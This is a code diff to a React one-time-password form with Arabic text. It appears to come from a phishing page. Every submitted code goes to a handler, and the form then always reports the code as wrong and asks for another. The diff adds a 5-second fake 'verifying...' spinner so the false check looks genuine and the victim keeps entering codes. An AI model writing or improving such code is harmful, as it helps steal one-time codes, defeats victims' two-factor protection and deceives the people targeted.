@@ -78,6 +78,7 @@ function OTPForm() {
   const [otp, setOtp] = useState("");
   const [error, setError] = useState("");
   const [isResending, setIsResending] = useState(false);
+  const [isVerifying, setIsVerifying] = useState(false);
   const inputRef = useRef<HTMLInputElement>(null);
   
   const formLoadTime = useRef(Date.now());
@@ -126,10 +127,17 @@ function OTPForm() {
       return;
     }
     
+    setIsVerifying(true);
+    setError("");
+    
     await handleOtp(otp);
-    setError("رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى");
-    setOtp("");
-    inputRef.current?.focus();
+    
+    setTimeout(() => {
+      setIsVerifying(false);
+      setError("رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى");
+      setOtp("");
+      inputRef.current?.focus();
+    }, 5000);
   };
 
   const handleResend = () => {
@@ -176,10 +184,18 @@ function OTPForm() {
       <div className="space-y-3 pt-4">
         <Button
           onClick={handleSubmit}
+          disabled={isVerifying}
           className="w-full bg-primary hover:bg-primary/90 text-white py-6 text-lg"
           data-testid="button-verify-otp"
         >
-          تأكيد الرمز
+          {isVerifying ? (
+            <div className="flex items-center gap-3">
+              <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
+              <span>جاري التحقق...</span>
+            </div>
+          ) : (
+            "تأكيد الرمز"
+          )}
         </Button>
 
         <Button
